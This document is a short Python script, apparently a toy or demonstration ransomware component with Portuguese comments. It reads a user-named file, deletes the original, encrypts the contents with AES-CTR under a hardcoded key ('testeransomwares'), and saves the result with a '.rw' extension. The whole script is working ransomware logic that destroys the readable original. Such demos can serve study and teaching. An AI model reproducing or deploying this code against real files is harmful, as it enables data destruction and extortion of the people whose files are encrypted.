import os
import pyaes

# Abrir arquivo alvo
filename = input("Nome do arquivo alvo: ")
file = open(filename, 'rb')
data = file.read()
file.close()

# Remove arquivo original
os.remove(filename)

# Key
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar
encrypted_data = aes.encrypt(data)

# Salva arquivo criptografado
new_file = filename + '.rw'
new_file = open(f"{new_file}", 'wb')
new_file.write(encrypted_data)
new_file.close()


